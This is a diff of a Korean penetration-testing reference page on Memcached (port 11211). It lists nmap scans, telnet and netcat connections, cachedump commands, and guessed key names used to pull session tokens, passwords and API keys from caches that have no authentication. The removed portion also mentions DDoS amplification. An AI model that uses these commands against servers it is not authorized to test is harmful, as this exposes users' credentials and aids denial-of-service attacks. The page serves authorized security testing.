@@ -1,173 +1,89 @@
 ---
 sidebar_position: 3
+title: Memcached (Port 11211)
 ---
 
-# memcached - 11211
+# Memcached (Port 11211) 취약점 진단
 
-> https://github.com/pd4d10/memcached-cli
+## Overview
 
-Memcached 서버 열거 및 정보 수집입니다.
+**Memcached**: 고성능 분산 메모리 객체 캐싱 시스템. 데이터베이스 부하를 줄이기 위해 사용됨.
+- **주요 포트**: 11211/TCP, 11211/UDP
+- **특징**: 기본적으로 인증(Authentication) 기능 없이 텍스트/바이너리 프로토콜로 작동하여, 내부망에 노출 시 민감 정보 유출 및 DDoS 증폭 공격에 활용될 수 있음
 
-## 기본 정보
+---
 
-- **포트**: 11211/TCP, 11211/UDP
-- **프로토콜**: ASCII, Binary
+## 1. Reconnaissance
 
-## 설치
-
+### 서비스 스캔 및 상태 확인
 ```bash
-npm install -g memcached-cli
+# [Nmap] TCP/UDP 포트 오픈 여부 및 memcached-info 스크립트 실행
+sudo nmap -p 11211 -sV -sU -sS --script memcached-info <target>
+
+# 모든 Memcached 관련 NSE 스크립트 실행
+sudo nmap -p 11211 --script "memcached-*" <target>
 ```
 
-## 연결
-
+### 서버 접속 및 기본 통계 열거
 ```bash
-# memcached-cli
-memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
+# Telnet을 이용한 평문 접속
+telnet <target> 11211
 
-# netcat (UDP)
-echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u <RHOST> 11211
-
-# telnet
-telnet <RHOST> 11211
-```
-
-## Nmap
-
-```bash
-# 정보 수집
-sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info
-
-# 모든 스크립트
-sudo nmap <RHOST> -p 11211 --script memcached-*
-```
-
-## 기본 명령어
-
-```bash
-# 연결 후
-
-# 통계
+# [연결 후] 기본 통계 정보 (버전, 연결 수, 메모리 등) 확인
 stats
 stats items
 stats slabs
 stats sizes
-
-# 캐시 덤프
-stats cachedump <SLAB_ID> <LIMIT>
-stats cachedump 1 0
-stats cachedump 1 100
-
-# 키 가져오기
-get <KEY>
 ```
 
-## 공통 키 이름
+---
+
+## 2. Exploitation
+
+### 인증 없는 접근 및 캐시 데이터 덤프
+인증 설정(SASL)이 되어 있지 않은 경우 캐시된 애플리케이션 데이터(세션, 패스워드 리셋 토큰 등)를 무단으로 추출 가능
 
 ```bash
-get link
-get file
-get user
-get passwd
-get account
-get username
-get password
-get email
+# 1. Slab ID 확인
+stats items
+# 응답 예시: STAT items:1:number 5
+
+# 2. 특정 Slab(예: 1)에서 전체(0) 또는 N개의 항목 캐시 키 덤프
+stats cachedump 1 0
+stats cachedump 1 100
+# 응답 예시: ITEM session_token_xyz [32 b; 1519734962 s]
+
+# 3. 획득한 키(Key)를 이용해 실제 데이터 값(Value) 추출
+get session_token_xyz
+```
+
+### 자동화 도구(memcached-cli) 활용
+명령줄에서 좀 더 편하게 Memcached를 제어
+```bash
+# 설치 (Node.js 환경)
+npm install -g memcached-cli
+
+# 연결
+memcached-cli <target>:11211
+
+# SASL 인증이 걸려있는 경우
+memcached-cli <user>:<pass>@<target>:11211
+```
+
+---
+
+## 3. Advanced Techniques
+
+### 주요 타겟 캐시 키(Key) 브루트포스
+캐시 덤프로 키 목록이 보이지 않더라도 응용 프로그램에서 널리 쓰이는 키 이름을 직접 요청하여 정보 획득 시도
+```bash
+# 애플리케이션에서 주로 저장하는 키 쿼리
 get session
+get user
+get admin
 get token
 get api_key
+get password
 get secret
 ```
 
-## 정보 수집
-
-### 서버 정보
-
-```
-stats
-```
-
-출력 예시:
-```
-STAT pid 21357
-STAT uptime 41557034
-STAT time 1519734962
-STAT version 1.4.25
-STAT libevent 2.0.21-stable
-STAT pointer_size 64
-STAT curr_connections 10
-STAT total_connections 1234
-STAT connection_structures 11
-STAT cmd_get 5678
-STAT cmd_set 1234
-STAT get_hits 4567
-STAT get_misses 1111
-STAT bytes_read 123456789
-STAT bytes_written 987654321
-STAT limit_maxbytes 67108864
-STAT threads 4
-```
-
-### Items 확인
-
-```
-stats items
-```
-
-### Slabs 확인
-
-```
-stats slabs
-```
-
-### 캐시 키 덤프
-
-```bash
-# Slab 1의 모든 항목
-stats cachedump 1 0
-
-# Slab 1의 100개 항목
-stats cachedump 1 100
-```
-
-## memccrashed (DDoS Amplification)
-
-**경고**: 이 공격은 불법이며 허가 없이 사용하면 안 됩니다.
-
-```bash
-# UDP 포트 열려있는지 확인
-sudo nmap <RHOST> -p 11211 -sU
-
-# Amplification factor 확인
-echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u <RHOST> 11211
-```
-
-## 취약점
-
-### 인증 없음
-
-```bash
-# 인증 없이 접근 가능한지 확인
-telnet <RHOST> 11211
-stats
-```
-
-### 데이터 유출
-
-```bash
-# 모든 키 확인
-stats items
-stats cachedump <SLAB_ID> 0
-
-# 중요 정보 검색
-get session_*
-get user_*
-get admin_*
-```
-
-## 참고
-
-- memcached는 기본적으로 인증이 없음
-- UDP 포트가 열려있으면 DDoS 증폭 공격에 악용 가능
-- 캐시된 세션 정보, 비밀번호 등 민감 정보 유출 가능
-- SASL 인증 설정 권장
